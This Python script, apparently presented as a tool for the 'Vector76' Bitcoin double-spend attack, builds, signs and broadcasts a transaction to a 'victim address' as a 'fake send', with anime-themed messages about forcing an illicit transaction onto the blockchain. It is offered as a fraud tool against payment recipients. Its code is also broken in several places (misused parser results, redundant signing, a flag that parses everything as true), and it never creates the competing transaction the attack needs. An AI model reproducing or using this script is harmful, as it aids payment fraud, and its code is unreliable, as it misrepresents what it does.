import argparse
import requests
import subprocess
import bitcoin.rpc
import bitcoin.core
import cryptos
import hashlib
import uuid
from bitcoinaddress import Wallet
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(description="How To Use vector76")
parser.add_argument("node_host",
                    help="Blockchain Node Host",
                    type=str)
parser.add_argument("node_port",
                    help="Blockchain Node Port",
                    type=int)
parser.add_argument("username",
                    help="Your BTC node username",
                    type=str)
parser.add_argument("password",
                    help="Your BTC node password",
                    type=str)
parser.add_argument("send_from_wifkey",
                    help="Fake send btc from wif key.",
                    type=str)
parser.add_argument("send_to",
                    help="Fake send btc to victim address.",
                    type=str)
parser.add_argument("amount_of_coins",
                    help="Amount of coins sent. (Enter in BTC units) The maximum amount delayed will vary depending on send_from.",
                    type=float)

parser.add_argument("--is_testnet",
                    help="Testnet flag (Default=True)",
                    default=True,
                    type=bool)

def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return round(btc_amount / satoshi)

def broadcast_transaction(raw_tx, testnet):

    url = "https://live.blockcypher.com/btc/push"
    res = requests.get(url).text
    soup = BeautifulSoup(res, 'html.parser')
    tag = soup.find_all(attrs={"name": "csrfmiddlewaretoken"})
    csrf = tag.get("value")

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    payload = f"tx_hex={raw_tx}&coin_symbol=btc&csrfmiddlewaretoken={csrf}"
    if testnet:
        headers = {'Content-Type': 'text/plain'}
        payload = raw_tx
        payload = f"tx_hex={raw_tx}&coin_symbol=btc-testnet&csrfmiddlewaretoken={csrf}"

    response = requests.post(url, data=payload, headers=headers)
    print(response.text)
    if response.status_code == 200:
        print("Transaction successfully broadcasted!")
    else:
        print(f"Failed to broadcast transaction. Status code: {response.status_code}")



args = parser.parse_args()
rpc_host = args.node_host
rpc_port = args.node_port
username = args.username
password = args.password
fake_send_from   = args.send_from_wifkey
victim_address   = args.send_to
amount_btc = args.amount_of_coins
testnet    = args.is_testnet

transaction_util = cryptos.Bitcoin(testnet=testnet)
print("Connecting Public Node...")
rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_host}",
                 service_port=rpc_port)
print("OK")
print()
balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))
    #balance = transaction_util.get_balance(send_from)
if balance["confirmed"] <= 0:
    balance = balance["unconfirmed"]
else:
    balance = balance["confirmed"]

fake_hash = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()

send_amount = to_satoshi(amount_btc)

if balance < send_amount:
    print(f"[!] insufficient funds. ")
    exit()

change_btc_amt = (balance - send_amount) #おつり
if testnet:
    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
else:
    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]

tx_victim = transaction_util.mktx(inputs, tx_victim)
tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
if testnet:
    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
print()
print("--------------------")
print(f"Fake Send to                       : {victim_address}")
print(f"Fake Send Amount (Satoshi unit)    : {send_amount} Satoshi")
print(f"Signed  RawTx             : {tx_victim}")
print(f"Testnet Mode              : {testnet}")
print("--------------------")
print()
print()
print("[+] READY...")
print()

print()
print("OK")

input(" --- Press enter key... --- ")
print()
print("Index > 強固なブロックチェーンに対して強制干渉を開始...")
print()
broadcast_transaction(tx_victim, testnet)
print("SND ITX TOBC  (ブロックチェーンに不正なトランザクションを送信!)")
print()
#ゴリ押し
print()
#おまけ
print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
print()

sound_name = "ImagineBreaker.mp3"
try:
    import soundplay
    soundplay.playsound(sound_name)
except:
    # Termux Only
    imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
    subprocess.run(imagine_breaker_cmd)

print("Done.")
